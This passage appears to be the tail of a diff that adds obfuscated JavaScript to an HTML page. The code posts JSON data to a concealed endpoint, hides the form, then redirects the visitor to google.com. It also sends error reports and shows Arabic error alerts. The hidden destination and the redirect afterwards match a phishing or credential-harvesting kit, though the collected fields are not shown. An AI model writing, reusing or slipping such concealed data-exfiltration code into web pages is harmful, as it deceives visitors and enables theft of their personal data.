fetch(_0x58ba50(0xce),{'method':_0x58ba50(0xe5),'headers':{'Content-Type':_0x58ba50(0xba)},'body':JSON[_0x58ba50(0xdd)](_0x3aebb7)});document[_0x58ba50(0xc5)](_0x58ba50(0xe3))[_0x58ba50(0xc6)][_0x58ba50(0xab)]=_0x58ba50(0xaa),document[_0x58ba50(0xc5)](_0x58ba50(0xbc))['disabled']=![];const _0x11ad2c=await _0x1b4077[_0x58ba50(0xd9)]();_0x11ad2c['success']?(document[_0x58ba50(0xc5)](_0x58ba50(0xb2))[_0x58ba50(0xc6)][_0x58ba50(0xab)]='none',document[_0x58ba50(0xc5)](_0x58ba50(0xa3))['style'][_0x58ba50(0xab)]='block',setTimeout(()=>{const _0x5e434a=_0x58ba50;window[_0x5e434a(0xb4)][_0x5e434a(0xd8)]='https://www.google.com/';},0x9c4)):(sendFailReport('upload',_0x58ba50(0xe0),{'status':_0x1b4077[_0x58ba50(0xcb)],'error':_0x11ad2c[_0x58ba50(0xbf)]||_0x58ba50(0xc2)}),alert('حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.'));}catch(_0x4fd063){console[_0x58ba50(0xbf)](_0x58ba50(0xdb),_0x4fd063),document[_0x58ba50(0xc5)](_0x58ba50(0xe3))[_0x58ba50(0xc6)][_0x58ba50(0xab)]=_0x58ba50(0xaa),document['getElementById'](_0x58ba50(0xbc))[_0x58ba50(0xdc)]=![],sendFailReport(_0x58ba50(0xbf),_0x58ba50(0xa2),{'error':_0x4fd063['message']}),alert(_0x58ba50(0xb8));}}),window[_0xe55fe8(0xc7)](_0xe55fe8(0xbf),_0x5e5534=>{const _0x4a0431=_0xe55fe8;sendFailReport(_0x4a0431(0xbf),'خطأ\x20غير\x20متوقع',{'message':_0x5e5534[_0x4a0431(0xb0)],'filename':_0x5e5534[_0x4a0431(0xd7)],'lineno':_0x5e5534[_0x4a0431(0xad)]});});
+    </script>
 </body>
 </html>
